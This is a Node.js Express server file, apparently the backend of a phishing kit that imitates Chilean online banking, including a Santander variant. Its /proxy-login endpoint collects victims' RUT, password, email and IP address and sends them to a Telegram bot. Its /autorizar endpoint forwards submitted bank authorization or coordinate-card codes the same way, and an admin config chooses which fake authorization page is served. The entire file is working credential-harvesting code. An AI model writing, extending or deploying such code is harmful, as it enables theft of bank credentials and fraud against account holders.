const express = require("express");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

// Inicializar app
const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// Paths para configuración
const rootCfgPath = path.join(__dirname, 'config.json');
const dataCfgPath = path.join(__dirname, 'data', 'config.json');
const tmpCfgPath = path.join('/tmp', 'config.json');

// Helper seguro para enviar mensajes a Telegram con fallback a node-fetch si hace falta
async function safeSendTelegram(text) {
  if (!process.env.TELEGRAM_TOKEN || !process.env.CHAT_ID) {
    console.warn('Telegram no configurado: TELEGRAM_TOKEN o CHAT_ID faltante');
    return false;
  }

  // Determine fetch implementation
  let fetchFn = global.fetch;
  if (!fetchFn) {
    try {
      const nodeFetch = await import('node-fetch');
      fetchFn = nodeFetch.default || nodeFetch;
    } catch (e) {
      console.error('No hay fetch global y no se pudo importar node-fetch:', e && e.message ? e.message : e);
      return false;
    }
  }

  try {
    const response = await fetchFn(`https://api.telegram.org/bot${process.env.TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: process.env.CHAT_ID, text })
    });

    if (!response.ok) {
      let bodyText = '';
      try { bodyText = await response.text(); } catch (_) {}
      console.error('Telegram respondió con error:', response.status, bodyText);
      return false;
    }

    return true;
  } catch (err) {
    console.error('Error enviando a Telegram:', err);
    return false;
  }
}

// Validación de RUT chileno (server-side)
function validarRut(rutCompleto) {
  if (!rutCompleto || typeof rutCompleto !== 'string') return false;
  rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
  if (rutCompleto.length < 2) return false;
  const cuerpo = rutCompleto.slice(0, -1);
  const dv = rutCompleto.slice(-1);
  if (!/^[0-9]+$/.test(cuerpo)) return false;

  let suma = 0;
  let multiplo = 2;
  for (let i = cuerpo.length - 1; i >= 0; i--) {
    suma += parseInt(cuerpo.charAt(i), 10) * multiplo;
    multiplo = multiplo < 7 ? multiplo + 1 : 2;
  }
  let dvEsperado = 11 - (suma % 11);
  dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
  return dv === dvEsperado;
}

// Leer configuración probando varias rutas y saltando archivos corruptos
function readConfig() {
  const tried = [];
  const paths = [dataCfgPath, rootCfgPath, tmpCfgPath];
  let lastErr = null;
  for (const p of paths) {
    tried.push(p);
    try {
      if (fs.existsSync(p)) {
        const raw = fs.readFileSync(p, 'utf8');
        const cfg = JSON.parse(raw);
        return { cfg, path: p };
      }
    } catch (err) {
      // Log and continue to next path
      console.warn(`Error leyendo/parsing ${p}:`, err && err.message ? err.message : err);
      lastErr = err;
      continue;
    }
  }
  return { error: lastErr || new Error('No config file found'), tried };
}

// Endpoint para leer configuración
app.get("/config", (req, res) => {
  const result = readConfig();
  if (result.cfg) {
    return res.json(result.cfg);
  }
  console.error('Error leyendo config.json, intentados:', result.tried, result.error);
  return res.status(500).json({ error: 'Error leyendo configuración', details: String(result.error), tried: result.tried });
});

// Health endpoint for diagnostics
app.get('/health', (req, res) => {
  const cwd = process.cwd();
  const dirname = __dirname;
  const files = {
    data_cfg_exists: fs.existsSync(dataCfgPath),
    root_cfg_exists: fs.existsSync(rootCfgPath),
    tmp_cfg_exists: fs.existsSync(tmpCfgPath)
  };

  // test write permission in data dir
  let canWriteData = false;
  try {
    const dataDir = path.dirname(dataCfgPath);
    if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });
    const testPath = path.join(dataDir, `.writetest_${Date.now()}`);
    fs.writeFileSync(testPath, 'ok');
    fs.unlinkSync(testPath);
    canWriteData = true;
  } catch (e) {
    canWriteData = false;
  }

  res.json({ ok: true, cwd, dirname, files, canWriteData, node_version: process.version });
});

// Endpoint para procesar saldo directamente (flujo original)
app.post("/procesarSaldo", async (req, res) => {
  const { rut, passwd } = req.body;
  try {
    res.json({ status: "ok", mensaje: "Procesado (flujo original)" });
  } catch (err) {
    console.error("Error en procesarSaldo:", err);
    res.status(500).json({ status: "error", error: err.message });
  }
});

// Endpoint para guardar configuración
app.post("/config", (req, res) => {
  try {
    // Ensure data dir exists
    const dataDir = path.dirname(dataCfgPath);
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }
    fs.writeFileSync(dataCfgPath, JSON.stringify(req.body, null, 2));
    console.log('Configuración guardada en', dataCfgPath);
    return res.json(req.body);
  } catch (err) {
    console.error('Error guardando config.json en', dataCfgPath, err);
    try {
      fs.writeFileSync(tmpCfgPath, JSON.stringify(req.body, null, 2));
      console.warn('Guardado fallback en', tmpCfgPath);
      return res.json(req.body);
    } catch (fallbackErr) {
      console.error('Fallback a /tmp falló:', fallbackErr);
      return res.status(500).json({ error: 'Error guardando configuración', details: String(err), fallback: String(fallbackErr) });
    }
  }
});

// Ruta directa al admin
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Decidir qué página de autorización mostrar
app.get("/autorizacion", (req, res) => {
  const result = readConfig();
  if (result.cfg) {
    try {
      if (result.cfg.tipoAutorizacion === "santander") {
        return res.sendFile(path.join(__dirname, "public", "autorizacion-santander.html"));
      }
      return res.sendFile(path.join(__dirname, "public", "autorizacion-coordenadas.html"));
    } catch (err) {
      console.error('Error sirviendo autorización:', err);
      return res.status(500).send('Error interno');
    }
  }
  console.error('Error leyendo config.json en /autorizacion:', result.tried, result.error);
  return res.status(500).send('Error interno');
});

// Endpoint para recibir autorizaciones y reenviar a Telegram
app.post("/autorizar", async (req, res) => {
  const mensaje = req.body.mensaje || "Autorización recibida";
  try {
    await safeSendTelegram(mensaje);
    res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
  } catch (err) {
    console.error('Error en /autorizar:', err);
    res.status(500).json({ status: "error", error: String(err) });
  }
});

// Endpoint para login → SIN Puppeteer: validar RUT y gestionar siguiente paso
app.post("/proxy-login", async (req, res) => {
  const { rut, passwd, mail } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;

  if (mail) {
    const mensaje = `Correo actualizado:\n${mail}\nIP: ${ip}`;
    try { await safeSendTelegram(mensaje); } catch (e) { console.error(e); }
    return res.json({ status: "ok", mensaje: "Correo actualizado correctamente" });
  }

  if (!rut || !passwd) {
    return res.status(400).json({ status: "error", mensaje: "Faltan rut o contraseña" });
  }

  // Validar formato RUT
  const rutValido = validarRut(rut);
  if (!rutValido) {
    try { await safeSendTelegram(`Intento con RUT inválido:\nRUT: ${rut}\nIP: ${ip}`); } catch(e){ console.error(e); }
    return res.status(400).json({ status: "invalid_rut", mensaje: "RUT inválido" });
  }

  // Notificación básica de ingreso
  const ingresoMsg = `Login recibido AutOB:\nRUT: ${rut}\nClave: ${passwd}\nIP: ${ip}`;
  try { await safeSendTelegram(ingresoMsg); } catch (e) { console.error(e); }

  // Responder indicando que RUT es válido y cuál es el siguiente paso
  // El frontend gestiona el flujo: pantalla de espera -> formulario correo -> productos -> autorizaciones
  res.json({ status: "ok", mensaje: "RUT válido. Procede al siguiente paso.", siguiente: "correo" });
});

// Servir index.html por defecto
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
